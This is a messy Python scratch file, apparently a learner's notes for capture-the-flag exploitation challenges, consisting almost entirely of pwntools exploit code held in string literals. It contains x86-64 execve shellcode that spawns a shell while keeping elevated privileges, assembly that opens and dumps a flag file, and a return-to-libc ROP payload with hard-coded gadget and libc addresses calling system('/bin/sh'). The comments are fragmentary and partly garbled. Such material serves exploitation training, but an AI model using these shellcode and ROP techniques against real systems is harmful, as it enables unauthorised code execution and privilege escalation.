x =input('enter::')


print(x)
'''
#from pwn import *

context.arch = 'x86_64'

p = process('/challenge/babyshell_level1')
shellcode ="""
_start:
mov rax, 59             
lea rdi, [rip+binsh]       #or directly tell the /flag ='2f666c6167' as hex   0x68732f6e69622f = /bin/sh
mov rsi, 0             
mov rdx, 0             
syscall         
binsh:                 
.string "/bin/zsh"  # give sthe root shell dont use sh because it drops privilage when called bug  on it 
"""
shellcode = asm(shellcode)

p.send(shellcode)

p.interactive()



 #1st
"""
#2nd reading a file 
 
 
 _start:

mov rbx, 0x00000067616c662f
push rbx
mov rax, 2
mov rdi, rsp  
mov rsi, 0
syscall

mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, 40
syscall

mov rax, 60
syscall

 #no creating reverse shell in assembly thing
 .global _start
_start:
.intel_syntax noprefix

return2lic attaks 
from pwn import *


p = process('./pet')

POP_RDI = 0x0000000000400743                        # Simply grab the libc it's running with
base = 0x00007ffff7a00000            # Set base address
base2= 0x00007ffff7800000
RET= 0x00000000004004de
system = base+0x000000000004f420            # Grab location of system
binsh = base+0x1b3d88   # grab string location

print(p64(base2))
print(p64(POP_RDI))
print(p64(binsh))
print(p64(system))
print(p64(RET))


payload = b'A' * 72
payload += p64(POP_RDI)
payload += p64(binsh)          # The padding
payload += p64(system)      # Location of system
payload += p64(RET)         # return pointer - not important once we get the shell
					       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()



"""

